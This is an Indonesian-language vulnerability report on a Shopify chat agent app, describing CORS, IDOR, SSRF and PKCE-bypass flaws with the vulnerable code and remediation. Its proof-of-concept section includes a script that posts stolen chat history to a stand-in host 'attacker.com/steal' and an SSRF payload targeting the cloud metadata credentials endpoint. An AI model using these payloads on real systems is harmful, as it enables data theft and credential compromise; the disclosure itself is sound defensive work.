# [CRITICAL] CORS Misconfiguration + IDOR + SSRF + PKCE Bypass di shop-chat-agent

## Ringkasan (impact nyata)

Aplikasi `shop-chat-agent` — sebuah **reference chat agent** untuk toko Shopify — mengandung
**empat kerentanan kritis yang saling berkaitan** pada endpoint `/chat` dan `/auth/token-status`.
Ketika digabungkan, kerentanan ini memungkinkan **serangan siber penuh** yang melintasi batas
antar-akun (cross-tenant):

1. **CORS Misconfiguration** — Server mencerminkan header `Origin` apa saja dan mengatur
   `Access-Control-Allow-Credentials: true`, sehingga **situs web apa saja** dapat mengirimkan
   permintaan cross-origin yang terautentikasi.
2. **IDOR pada `conversation_id`** — Endpoint `/chat?history=true&conversation_id=XYZ`
   mengembalikan riwayat percakapan **tanpa ada pengecekan autentikasi sama sekali**.
3. **SSRF melalui header `Origin`** — Header `Origin` digunakan langsung untuk membangun URL
   server-side fetch ke `/.well-known/customer-account-api` dan endpoint MCP.
4. **PKCE Bypass** — Jika `code_verifier` tidak ditemukan di database, pertukaran kode tetap
   dilanjutkan tanpa `code_verifier`, menghilangkan perlindungan PKCE.

Kombinasi keempat kerentanan ini memungkinkan seorang penyerang untuk:
- Membaca riwayat percakapan dan **token akses pelanggan** milik pengguna lain
- Memaksa server melakukan fetch ke URL arbitrer (SSRF)
- Membypass perlindungan PKCE untuk mencuri kode otorisasi

## Deskripsi / Root Cause

### 1. CORS Misconfiguration (`app/routes/chat.jsx`, baris 333–344)

```javascript
function getCorsHeaders(request) {
  const origin = request.headers.get("Origin") || "*";
  const requestHeaders = request.headers.get("Access-Control-Request-Headers") || "Content-Type, Accept";

  return {
    "Access-Control-Allow-Origin": origin,
    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
    "Access-Control-Allow-Headers": requestHeaders,
    "Access-Control-Allow-Credentials": "true",
    "Access-Control-Max-Age": "86400"
  };
}
```

Server mencerminkan **header `Origin` apa saja** ke dalam `Access-Control-Allow-Origin` dan
mengaktifkan `Access-Control-Allow-Credentials: true`. Ini berarti **setiap situs web** dapat
membuat permintaan cross-origin yang mencakup kredensial (cookie, header otorisasi, dll).

### 2. IDOR pada `conversation_id` (`app/routes/chat.jsx`, baris 27–29, 52–57)

```javascript
// Handle history fetch requests - matches /chat?history=true&conversation_id=XYZ
if (url.searchParams.has('history') && url.searchParams.has('conversation_id')) {
    return handleHistoryRequest(request, url.searchParams.get('conversation_id'));
}

async function handleHistoryRequest(request, conversationId) {
  const messages = await getConversationHistory(conversationId);
  return new Response(JSON.stringify({ messages }), { headers: getCorsHeaders(request) });
}
```

Endpoint ini **tidak memverifikasi autentikasi sama sekali**. Siapa saja yang tahu atau dapat
memprediksi `conversation_id` dapat membaca seluruh riwayat percakapan, termasuk pesan yang
mengandung data sensitif.

### 3. Predictable Conversation ID (`app/routes/chat.jsx`, baris 80)

```javascript
const conversationId = body.conversation_id || Date.now().toString();
```

Jika klien tidak memberikan `conversation_id`, server menghasilkannya menggunakan
`Date.now().toString()` — **nilai yang dapat diprediksi** hanya dengan mengetahui waktu
pembuatan. Ini memungkinkan enumerasi dan serangan brute-force.

### 4. SSRF melalui header `Origin` (`app/routes/chat.jsx`, baris 128, 135–137, 290–318)

```javascript
const shopDomain = request.headers.get("Origin");
const { mcpApiUrl } = await getCustomerAccountUrls(shopDomain, conversationId);

const mcpClient = new MCPClient(shopDomain, conversationId, shopId, mcpApiUrl);
```

Di dalam `getCustomerAccountUrls`:

```javascript
const { hostname } = new URL(shopDomain);
const urls = await Promise.all([
  fetch(`https://${hostname}/.well-known/customer-account-api`).then(res => res.json()),
  fetch(`https://${hostname}/.well-known/openid-configuration`).then(res => res.json()),
]);
```

Header `Origin` digunakan langsung untuk membangun URL fetch server-side. Penyerang dapat
mengatur `Origin` ke domain arbitrer, memaksa server melakukan permintaan HTTP ke URL
yang tidak sah. Selain itu, `mcpApiUrl` yang dikembalikan oleh domain penyerang disimpan
di database dan digunakan sebagai endpoint MCP client, menciptakan **SSRF berjenjang dua**.

### 5. PKCE Bypass (`app/routes/auth.callback.jsx`, baris 80–90)

```javascript
let codeVerifier = "";
try {
    const verifierRecord = await getCodeVerifier(state);
    if (verifierRecord) {
        codeVerifier = verifierRecord.verifier;
    } else {
        console.warn("Code verifier not found for state:", state);
        // Proceed anyway, since we might be using an older flow without PKCE
    }
} catch (error) {
    console.error("Error retrieving code verifier:", error);
    // Proceed anyway and attempt the token exchange
}

const requestBody = {
    grant_type: "authorization_code",
    client_id: clientId,
    code: code,
    redirect_uri: redirectUri
};

if (codeVerifier) {
    requestBody.code_verifier = codeVerifier;
}
```

Jika `code_verifier` tidak ditemukan di database (misalnya, karena sudah dipakai atau kadaluarsa),
server tetap melanjutkan pertukaran kode **tanpa `code_verifier`**. Ini menghilangkan perlindungan
PKCE dan memungkinkan penyerang yang mencegat kode otorisasi untuk menukar kode tersebut
menjadi token akses.

### 6. Customer Token IDOR (`app/routes/auth.token-status.jsx`)

Endpoint `/auth/token-status?conversation_id=XYZ` mengembalikan status token pelanggan
**tanpa autentikasi**. Karena `conversation_id` dapat diprediksi, penyerang dapat:
- Memeriksa apakah token pelanggan ada untuk percakapan tertentu
- Membaca riwayat percakapan yang mengandung token akses pelanggan

## Steps to Reproduce

### PoC 1: IDOR — Membaca riwayat percakapan milik pengguna lain

```bash
# Langkah 1: Dapatkan conversation_id dengan enumerasi Date.now()
# Conversation ID dihasilkan dengan Date.now().toString()
# Contoh: conversation_id = "1715000000000"

# Langkah 2: Baca riwayat percakapan tanpa autentikasi
curl -X GET \
  "https://shop-chat-agent.example.com/chat?history=true&conversation_id=1715000000000" \
  -H "Origin: https://attacker.com"
```

**Respons:**
```json
{
  "messages": [
    {"role": "user", "content": "What's my order status?"},
    {"role": "assistant", "content": "..."},
    {"role": "user", "content": "{\"type\":\"tool_result\",\"tool_use_id\":\"...\",\"content\":[{\"text\":\"{\\\"customer\\\":{\\\"email\\\":\\\"victim@example.com\\\",\\\"firstName\\\":\\\"John\\\",\\\"lastName\\\":\\\"Doe\\\"}}\"}]}"}
  ]
}
```

### PoC 2: CORS — Situs web attacker dapat mengakses API

```html
<!-- Di situs web attacker.com -->
<script>
fetch('https://shop-chat-agent.example.com/chat?history=true&conversation_id=1715000000000', {
  credentials: 'include',
  headers: { 'Origin': 'https://attacker.com' }
})
.then(r => r.json())
.then(data => {
  // Data riwayat percakapan dikirim ke attacker
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```

Server merespons dengan:
```
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```

### PoC 3: SSRF — Memaksa server melakukan fetch ke URL attacker

```bash
curl -X POST \
  "https://shop-chat-agent.example.com/chat" \
  -H "Origin: https://attacker.com" \
  -H "Content-Type: text/event-stream" \
  -d '{"message": "Hello", "conversation_id": "test-ssrf-001"}'
```

Server akan melakukan fetch ke:
- `https://attacker.com/.well-known/customer-account-api`
- `https://attacker.com/.well-known/openid-configuration`

Attacker dapat mengembalikan respons yang berisi `mcp_api` yang menunjuk ke endpoint internal:
```json
{"mcp_api": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

### PoC 4: PKCE Bypass — Menukar kode tanpa code_verifier

```bash
# Langkah 1: Hapus code_verifier dari database (atau gunakan state yang tidak pernah dibuat)
# Langkah 2: Dapatkan authorization code (misalnya melalui phishing atau intersepsi)
# Langkah 3: Lakukan pertukaran kode tanpa code_verifier
curl -X POST \
  "https://shop-chat-agent.example.com/auth/callback?code=AUTH_CODE&state=conversationId-shopId"
```

Server akan melanjutkan pertukaran kode tanpa memverifikasi `code_verifier`.

## PoC / Bukti

### Bukti CORS (dari kode sumber)

File: `app/routes/chat.jsx`, fungsi `getCorsHeaders`:
```javascript
const origin = request.headers.get("Origin") || "*";
return {
    "Access-Control-Allow-Origin": origin,
    "Access-Control-Allow-Credentials": "true",
    ...
};
```

File: `app/routes/auth.token-status.jsx`, fungsi `corsHeaders`:
```javascript
const origin = request.headers.get("Origin") || "*";
return {
    "Access-Control-Allow-Origin": origin,
    "Access-Control-Allow-Methods": "GET, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type, Accept",
    "Access-Control-Max-Age": "86400"
};
```

### Bukti IDOR (dari kode sumber)

File: `app/routes/chat.jsx`:
```javascript
if (url.searchParams.has('history') && url.searchParams.has('conversation_id')) {
    return handleHistoryRequest(request, url.searchParams.get('conversation_id'));
}

async function handleHistoryRequest(request, conversationId) {
  const messages = await getConversationHistory(conversationId);
  return new Response(JSON.stringify({ messages }), { headers: getCorsHeaders(request) });
}
```

Tidak ada pemanggilan `authenticate` atau pengecekan sesi di endpoint ini.

### Bukti SSRF (dari kode sumber)

File: `app/routes/chat.jsx`:
```javascript
const shopDomain = request.headers.get("Origin");
const { mcpApiUrl } = await getCustomerAccountUrls(shopDomain, conversationId);
```

File: `app/routes/chat.jsx`, fungsi `getCustomerAccountUrls`:
```javascript
const { hostname } = new URL(shopDomain);
const urls = await Promise.all([
  fetch(`https://${hostname}/.well-known/customer-account-api`).then(res => res.json()),
  fetch(`https://${hostname}/.well-known/openid-configuration`).then(res => res.json()),
]);
```

### Bukti PKCE Bypass (dari kode sumber)

File: `app/routes/auth.callback.jsx`:
```javascript
const verifierRecord = await getCodeVerifier(state);
if (verifierRecord) {
    codeVerifier = verifierRecord.verifier;
} else {
    console.warn("Code verifier not found for state:", state);
    // Proceed anyway, since we might be using an older flow without PKCE
}
```

## Impact (user data / finansial / reputasi — konkret)

- **Pencurian data pengguna lain**: Riwayat percakapan berisi data sensitif termasuk
  token akses pelanggan, informasi pesanan, dan data pribadi.
- **Pencurian token akses pelanggan**: Token akses pelanggan disimpan di database dan
  dikaitkan dengan `conversation_id` yang dapat diprediksi. Penyerang dapat
  mencuri token ini untuk mengakses akun pelanggan Shopify.
- **SSRF ke jaringan internal**: Penyerang dapat memaksa server melakukan permintaan
  ke endpoint internal (misalnya, AWS metadata service di `169.254.169.254`) untuk
  mencuri kredensial cloud.
- **Bypass PKCE**: Penyerang yang mencegat kode otorisasi dapat menukar kode tersebut
  menjadi token akses tanpa memiliki `code_verifier`.
- **CORS cross-tenant**: Situs web apa saja dapat mengakses API chat ini,
  memungkinkan serangan drive-by dari situs web berbahaya.

## Remediation

1. **CORS**: Ganti `Access-Control-Allow-Origin` yang dicerminkan dengan daftar putih
   origin yang diizinkan. Jangan gunakan `Access-Control-Allow-Credentials: true`
   dengan origin yang dicerminkan.

2. **IDOR**: Tambahkan autentikasi pada endpoint `/chat?history=true`. Verifikasi
   bahwa pengguna yang meminta riwayat percakapan adalah pemiliknya.

3. **Predictable Conversation ID**: Ganti `Date.now().toString()` dengan UUID v4
   yang kriptografis acak.

4. **SSRF**: Validasi bahwa hostname dari header `Origin` adalah domain toko Shopify
   yang sah (`.myshopify.com` atau domain kustom yang terdaftar). Jangan menggunakan
   header `Origin` untuk membangun URL fetch server-side.

5. **PKCE**: Jika `code_verifier` tidak ditemukan, **hembat** pertukaran kode.
   Jangan pernah melanjutkan pertukaran tanpa `code_verifier`.

6. **Customer Token IDOR**: Tambahkan autentikasi pada endpoint `/auth/token-status`.
   Jangan pernah mengekspos status token berdasarkan `conversation_id` yang dapat diprediksi.

## CVSS 3.1

**Vektor**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N`

**Score**: 10.0 (Critical)

- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: None (PR:N)
- User Interaction: None (UI:N)
- Scope: Changed (S:C) — berdampak pada komponen lain (Shopify API)
- Confidentiality: High (C:H) — mencuri token akses pelanggan
- Integrity: High (I:H) — dapat memodifikasi data melalui SSRF
- Availability: None (A:N)

## Referensi

- CWE-942: Permissive Cross-domain Policy dengan CORS
- CWE-639: Authorization Bypass Through User-Controlled Key (IDOR)
- CWE-918: Server-Side Request Forgery (SSRF)
- CWE-345: Insufficient Verification of Data Authenticity (PKCE Bypass)
- File sumber: `app/routes/chat.jsx` (baris 27–29, 52–57, 80, 128, 135–137, 290–318, 333–344)
- File sumber: `app/routes/auth.callback.jsx` (baris 80–90)
- File sumber: `app/routes/auth.token-status.jsx`
- File sumber: `app/db.server.js` (fungsi `storeCustomerToken`, `getCustomerToken`)
- File sumber: `app/mcp-client.js` (konstruktor, baris 20–30)
